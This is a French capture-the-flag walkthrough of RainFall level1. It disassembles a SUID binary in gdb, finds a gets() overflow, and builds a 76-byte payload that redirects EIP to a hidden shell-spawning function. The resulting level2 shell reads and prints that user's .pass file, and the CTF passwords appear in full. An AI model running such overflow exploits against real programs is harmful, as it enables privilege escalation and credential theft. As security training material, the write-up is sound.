## 1: Analyse

### A: C'est quoi mon binaire?


  ```shell
  # On se connecte si c'est pas déja fait via le level0
  $ ssh level1@127.0.0.1 -p 4242
        _____       _       ______    _ _
      |  __ \     (_)     |  ____|  | | |
      | |__) |__ _ _ _ __ | |__ __ _| | |
      |  _  /  _` | | '_ \|  __/ _` | | |
      | | \ \ (_| | | | | | | | (_| | | |
      |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                    Good luck & Have fun

      To start, ssh with level0/level0 on 10.0.2.15:4242

  # On rentre le password
  level1@127.0.0.1's password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
    GCC stack protector support:            Enabled
    Strict user copy checks:                Disabled
    Restrict /dev/mem access:               Enabled
    Restrict /dev/kmem access:              Enabled
    grsecurity / PaX: No GRKERNSEC
    Kernel Heap Hardening: No KERNHEAP
  System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
  level1@RainFall:~$
  
  # On regarde ce qu'on a
  level1@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
    -rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
    -rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile

  # On teste les arguments
  level1@RainFall:~$ ./level1
    hello
  level1@RainFall:~$ ./level1
    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE
    Segmentation fault (core dumped)
  ```
  * On a un binaire appartenant a level2 dans le home avec les droits SUID...
  * ... qui demande un input ...
  * ... qui segfault avec un input trop long

### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    level1@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    level1@RainFall:/tmp$ gdb ~/level1
      [...]
      Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info function
      All defined functions:

      Non-debugging symbols:
      0x080482f8  _init
      0x08048340  gets
      0x08048340  gets@plt
      0x08048350  fwrite
      0x08048350  fwrite@plt
      0x08048360  system
      0x08048360  system@plt
      0x08048370  __gmon_start__
      0x08048370  __gmon_start__@plt
      0x08048380  __libc_start_main
      0x08048380  __libc_start_main@plt
      0x08048390  _start
      0x080483c0  __do_global_dtors_aux
      0x08048420  frame_dummy # Une fonction frame_dummy
      0x08048444  run         # Une fonction run
      0x08048480  main        # Ok on a main ca c'est normal
      0x080484a0  __libc_csu_init
      0x08048510  __libc_csu_fini
      0x08048512  __i686.get_pc_thunk.bx
      0x08048520  __do_global_ctors_aux
      0x0804854c  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x80497c0     # On imprime la valeur passée en argument en format char
      0x80497c0 <stdout@@GLIBC_2.0>:	 ""
    gdb-peda$ x/s 0x8048570     # Idem
      0x8048570:	 "Good... Wait what?\n"
    gdb-peda$ x/s 0x8048584     # Idem
      0x8048584:	 "/bin/sh"
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # As usual, initialisation, alignement et allocation de 80 octets
      0x08048480 <+0>:	push   ebp            # On stocke le begin pointer
      0x08048481 <+1>:	mov    ebp,esp        # On rebouge ebp au debut de la zone buffer
      0x08048483 <+3>:	and    esp,0xfffffff0 # On applique un masque sur esp pour aligner la mémoire
      0x08048486 <+6>:	sub    esp,0x50       # On laise 80 octets d'espace

      # Call gets(array[80 - 16])
      0x08048489 <+9>:	lea    eax,[esp+0x10]       # On stocke l'addresse esp + 16 dans eax
      0x0804848d <+13>:	mov    DWORD PTR [esp],eax  # On push eax (esp + 16) sur la stack
      0x08048490 <+16>:	call   0x8048340 <gets@plt> # On call gets avec les arguments

      # Sortie de programme, retourne le return de gets
      0x08048495 <+21>:	leave
      0x08048496 <+22>:	ret

      End of assembler dump.
  ```

  * Ok, donc on a un main qui call gets et return. Ni frame_dummy ni run ne sont appellées.

  * On voit que gets est pas protégé et avec quelques recherches on trouve une faille expliquée plus tard.

  * Regardons tout d'abord run (frame_dummy ne nous servira pas ici)

  ```shell
    Dump of assembler code for function run:
    # Comme d'habitude, on initialise et on alloue 24 octets.
    0x08048444 <+0>:	push   ebp      # On stocke le begin pointer
    0x08048445 <+1>:	mov    ebp,esp  # On rebouge ebp au debut de la zone buffer
    0x08048447 <+3>:	sub    esp,0x18 # On laise 24 octets d'espace

    # Call fwrite("Good... Wait what?\n", 1, 19, stdout)
    0x0804844a <+6>:	mov    eax,ds:0x80497c0         # On stocke la valeur du datasegment 0x80497c0 (stdout, voir ci-dessus) dans eax
    0x0804844f <+11>:	mov    edx,eax                  # On met eax (stdout) dans edx
    0x08048451 <+13>:	mov    eax,0x8048570            # On stocke le pointeur 0x8048570 ("Good... Wait what?\n") dans eax
    0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx  # On push edx (stdout) sur la stack
    0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13 # On push 19 sur la stack
    0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1  # On push 1 sur la stack
    0x0804846a <+38>:	mov    DWORD PTR [esp],eax      # On push eax ("Good... Wait what?\n") sur la stack
    0x0804846d <+41>:	call   0x8048350 <fwrite@plt>   # On call fwrite avec tous ces arguments

    # Call system("/bin/sh") !
    0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584  # On push la valeur de 0x8048584 ("/bin/sh") sur la stack
    0x08048479 <+53>:	call   0x8048360 <system@plt>     # On fait un call system avec cet argument (On lance un shell)

    # Retour fonction
    0x0804847e <+58>:	leave
    0x0804847f <+59>:	ret
    End of assembler dump.
  ```

  * run imprime "Good... Wait what?\n" avant de lancer un shell! Mais n'est bien évidemment pas appelée.

  * On en a suffisement pour partir sur un exploit (voir partie 3)

## 2: Comportement
> Une fois recomposé, on comprend que le main call juste un gets (notre faille), et run lance un shell.


## 3: Exploit

### A: Explication

> La technique que l'on va utiliser est le buffer overflow. On va réécrire sur l'EIP, qui est un pointeur sur la prochaine instruction à éxécuter après le return et on va lui donner l'addresse de run, qui va nous lancer un shell avec les droits de level2.

> En effet, le gets va écrire à partir du pointeur qu'on lui aura passé, sans se soucier de la taille. Or, le programme a alloué de la place uniquement pour 80 - 16 octets. Un petit dessin s'impose:

```
                  Hautes adresses
                +-----------------+
                |      ARGV       |
                +-----------------+
                |      ARGC       |
                +-----------------+
                |       EIP       |  => Adresse de l'instruction executée a la fin de la fonction
                +-----------------+
                |    ANCIEN_EBP   |  => Push a l'instruction main+0
      EBP    => +-----------------+  => Mov main+1 met le EBP ici
                |                 |
  EBP-0x4    => +-----------------+
                |                 |
  EBP-0x8    => +-----------------+
                         .
                         .
                         .
                +-----------------+
                |                 |
  ESP+0x10   => +-----------------+ => C'est cette addresse qui est envoyée a gets
                |                 |
  ESP+0x8    => +-----------------+
                |                 |
  ESP+0x4    => +-----------------+
                |    ESP+0x10     |
ESP/EBP-0x50 => +-----------------+ <= Mov main+6 met le ESP ici
EIP du gets  => |    main + 21    |  -+
                +-----------------+   |
                |     main EBP    |   |
 EBP du gets => +-----------------+   | => STACK DE GETS
                         .            .
                         .            .
                         .            .
                  Basses adresses
```

> Ici on envoie a gets l'adresse ESP+0x10. gets va ecrire a cette addresse en remontant dangereusement vers EBP.

> Dangereusement, car passé les 80 - 16 octets (0x50 - 0x10), il va commencer a écrire sur l'ancien EBP et sur l'EIP.

> Si ce qu'on écrit dans l'input à l'endroit de l'EIP est l'addresse de la fonction run, elle sera appelée après le retour de la fonction.

> C'est là l'origine des segfault: on écrit n'importe quoi dans l'EIP, et si c'est pas une addresse d'instruction a exécuter, ça crash.

### B: Creation de l'exploit

* Il nous faut donc: l'adresse de la fonction run, et à partir de combien de charactères on va réécrire sur l'EIP.

```shell
  # On choppe l'addresse de run
  gdb-peda$ info function
    [...]
    0x08048444  run
    [...]
  
  # On crée un pattern avec peda (générateur de patterns aussi trouvable sur internet)
  gdb-peda$ pattern create 200 pattern1
    Writing pattern of 200 chars to filename "pattern1"
  
  # On le cat pour le copier
  gdb-peda$ cat pattern1
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

  # On lance la fonction et on colle le pattern
  gdb-peda$ run
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

    # BIM segfault
    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    [...]
    # Ici la portion du pattern qui a écrit sur l'EIP
    EIP: 0x41344141 ('AA4A')
    [...]
    [-------------------------------------code-------------------------------------]
    # Ici la confirmation que le segfault est dû à une mauvaise addresse
    Invalid $PC address: 0x41344141
    [------------------------------------stack-------------------------------------]
    # Ici la stack en partant des addresses basses. On voit notre string écrite
    0000| 0xbffff6d0 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0004| 0xbffff6d4 ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0008| 0xbffff6d8 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0012| 0xbffff6dc ("AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0016| 0xbffff6e0 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0020| 0xbffff6e4 ("AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0024| 0xbffff6e8 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0028| 0xbffff6ec ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    [------------------------------------------------------------------------------]
    Stopped reason: SIGSEGV
    0x65414149 in ?? ()
  
  # Plutôt que de compter à la main combien de chars il faut imprimer avant l'addresse de run() on va le faire calculer par peda
  gdb-peda$ pattern search
    [...]
    Registers contain pattern buffer:
    # On l'a ! Il faut écrire 76 random chars avant l'addresse de run()
    EIP+0 found at offset: 76
    # Comme on peut s'y attendre EBP se trouve 4 octets avant EIP
    EBP+0 found at offset: 72
    [...]
```

* On a donc tous les prérequis. En transformant en little indian l'addresse de run, on va pouvoir construire la string suivante (0x 08 04 84 44 => \x44 \x84 \x04 \x08 vous voyez comment faire maintenant):

```shell
  level1@RainFall:/tmp$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > pattern1
```

* Et maintenant la magie opère (enfin presque):

```shell
  level1@RainFall:/tmp$ ~/level1 < pattern1
    Good... Wait what?
    Segmentation fault (core dumped)
```

* Oh non! Le programme exit tout de suite apres le call a run(). Il faut [garder stdin ouvert avec cat](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process):
> " The shell doesn't have any input, when it detects EOF it dies. "

```shell
  level1@RainFall:/tmp$ cat /tmp/pattern1 - | ~/level1
    Good... Wait what?
  # A partir de là, rien n'est prompt. Mais on peut écrire:
  whoami
    level2
  # Youhou!
  cat /home/user/level2/.pass
    53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
  # CTRL + D
  Segmentation fault (core dumped)
  level1@RainFall:/tmp$ su level2
    Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
  level2@RainFall:~$
```